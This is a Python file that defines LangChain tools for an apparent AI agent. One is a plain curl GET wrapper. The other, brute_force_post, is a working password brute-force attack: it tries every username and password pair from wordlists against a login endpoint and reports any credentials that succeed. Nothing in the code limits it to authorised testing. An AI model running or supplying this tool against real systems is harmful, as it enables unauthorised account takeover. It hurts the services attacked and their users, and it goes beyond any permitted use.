from langchain_core.tools import tool
import subprocess
import json

@tool
def curl_get(url: str):
    """
    Perform a GET request using curl.
    
    Args:
        url (str): The URL to fetch data from.
        
    Returns:
        str: The response body from the GET request.
    """
    command = ["curl", "-s", url]
    try:
        result = subprocess.run(command, capture_output=True, text=True)
        if result.returncode == 0:
            return f"Response:\n{result.stdout.strip()}"
        else:
            return f"Error fetching URL. {result.stderr.strip()}"
    except Exception as e:
        return f"Command error: {str(e)}"   
    

@tool
def brute_force_post(url: str, users_file: str, passwords_file: str, success_message: str):
    """
    Perform a brute-force attack on a POST authentication endpoint using curl.
    
    Args:
        url (str): The URL of the authentication endpoint.
        users_file (str): Path to the file containing usernames (one per line).
        passwords_file (str): Path to the file containing passwords (one per line).
        success_message (str): The message indicating successful authentication.
        
    Returns:
        str: Success message with valid credentials or a failure message.
    """
    try:
        with open(users_file, 'r') as uf, open(passwords_file, 'r') as pf:
            users = [line.strip() for line in uf]
            passwords = [line.strip() for line in pf]
            
        for user in users:
            for password in passwords:
                payload = f'{{"username":"{user}", "password":"{password}"}}'
                command = [
                    "curl", "-s", "-X", "POST", url,
                    "-H", "Content-Type: application/json",
                    "-d", payload
                ]
                
                result = subprocess.run(command, capture_output=True, text=True)
                
                if success_message in result.stdout:
                    return f"Success! Valid credentials found:\nUsername: {user}\nPassword: {password}"
        
        return "Brute-force attempt completed. No valid credentials found."
    except Exception as e:
        return f"An error occurred: {str(e)}"
    
curl_tools = [curl_get, brute_force_post]